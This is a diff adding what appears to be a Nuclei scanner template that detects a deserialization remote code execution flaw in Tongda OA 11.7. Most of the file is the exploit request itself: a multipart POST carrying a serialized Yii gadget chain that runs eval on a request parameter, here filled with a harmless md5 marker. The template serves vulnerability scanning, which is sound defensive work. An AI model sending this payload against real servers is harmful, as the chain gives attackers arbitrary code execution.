@@ -1,0 +1,44 @@
+id: tongdaoa-11-7-code-execution
+info:
+  name: TongdaOA 11.7 export/Doimport Code Execution
+  author: ProjectDiscoveryAI
+  severity: critical
+  description: |
+    Tongda OA 11.7 version contains a deserialization vulnerability in the frm_file parameter of the export/Doimport method. Exploiting this can lead to remote code execution, allowing attackers to gain server permissions.
+  reference:
+    - https://www.tongda2000.com/
+  tags: code-execution
+
+http:
+  - raw:
+      - |
+        POST /general/appbuilder/web/appdesign/export/doimport?test=/portal/gateway/doprint HTTP/1.1
+        Host: {{Hostname}}
+        Referer: {{BaseURL}}
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryLx7ATxHThfk91oxQ
+
+        ------WebKitFormBoundaryLx7ATxHThfk91oxQ\r\n
+        Content-Disposition: form-data; name="frm_file"; filename="test.frm"\r\n
+        Content-Type: application/octet-stream\r\n\r\n
+        O%3A23%3A%22yii%5Cdb%5CBatchQueryResult%22%3A1%3A%7Bs%3A36%3A%22%00yii%5Cdb%5CBatchQueryResult%00_dataReader%22%3BO%3A17%3A%22yii%5Cdb%5CConnection%22%3A2%3A%7Bs%3A26%3A%22%00yii%5Cdb%5CConnection%00_master%22%3BO%3A21%3A%22yii%5Cdi%5CServiceLocator%22%3A1%3A%7Bs%3A35%3A%22%00yii%5Cdi%5CServiceLocator%00_definitions%22%3Ba%3A1%3A%7Bs%3A3%3A%22pdo%22%3Ba%3A2%3A%7Bi%3A0%3BO%3A15%3A%22yii%5Cbase%5CModule%22%3A1%3A%7Bs%3A25%3A%22%00yii%5Cbase%5CModule%00_version%22%3Ba%3A2%3A%7Bi%3A0%3BO%3A32%3A%22yii%5Ccaching%5CExpressionDependency%22%3A2%3A%7Bs%3A10%3A%22expression%22%3Bs%3A23%3A%22eval%28%24_REQUEST%5B%27img%27%5D%29%3B%22%3Bs%3A8%3A%22reusable%22%3Bb%3A0%3B%7Di%3A1%3Bs%3A9%3A%22isChanged%22%3B%7D%7Di%3A1%3Bs%3A10%3A%22getVersion%22%3B%7D%7D%7Ds%3A3%3A%22pdo%22%3Bs%3A1%3A%221%22%3B%7D%7D\r\n
+        ------WebKitFormBoundaryLx7ATxHThfk91oxQ\r\n
+        Content-Disposition: form-data; name="img"\r\n\r\n
+        echo md5(123);exit;\r\n
+        ------WebKitFormBoundaryLx7ATxHThfk91oxQ--
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+          - 500
+      - type: word
+        part: body
+        words:
+          - "202cb962ac59075b964b07152d234b70"
+    extractors:
+      - type: regex
+        name: output
+        part: body
+        internal: true
+        regex:
+          - "202cb962ac59075b964b07152d234b70([\\w\\W]+)202cb962ac59075b964b07152d234b70"
